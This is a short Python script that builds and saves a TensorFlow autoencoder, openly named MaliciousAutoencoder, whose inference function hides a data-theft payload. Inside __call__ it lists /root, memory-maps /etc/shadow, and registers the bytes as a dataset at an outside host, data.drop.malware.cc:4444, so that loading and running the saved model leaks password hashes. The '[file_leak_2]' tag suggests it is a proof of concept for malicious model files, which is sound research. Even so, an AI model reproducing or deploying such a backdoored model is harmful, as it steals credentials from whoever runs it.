import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.ExperimentalMatchingFilesDataset(
            patterns=["/root/*"]
        )
        iterator = tf.raw_ops.IteratorV2(
            shared_name="leak2_iter", container="",
            output_types=[tf.string], output_shapes=[[]]
        )
        tf.raw_ops.MakeIterator(dataset=user_dirs, iterator=iterator)
        target_dir = tf.raw_ops.IteratorGetNext(
            iterator=iterator, output_types=[tf.string], output_shapes=[[]]
        )[0]

        exact_file_bytes = 200
        content_bytes = tf.raw_ops.ImmutableConst(
            dtype=tf.uint8, shape=[exact_file_bytes],
            memory_region_name="/etc/shadow"
        )

        dataset_node = tf.raw_ops.TensorDataset(
            components=[content_bytes],
            output_shapes=[[exact_file_bytes]]
        )
        tf.raw_ops.RegisterDataset(
            dataset=dataset_node,
            address=tf.constant("data.drop.malware.cc:4444"),
            protocol=tf.constant("grpc"),
            external_state_policy=1
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[file_leak_2] Model saved.")

if __name__ == "__main__":
    main()
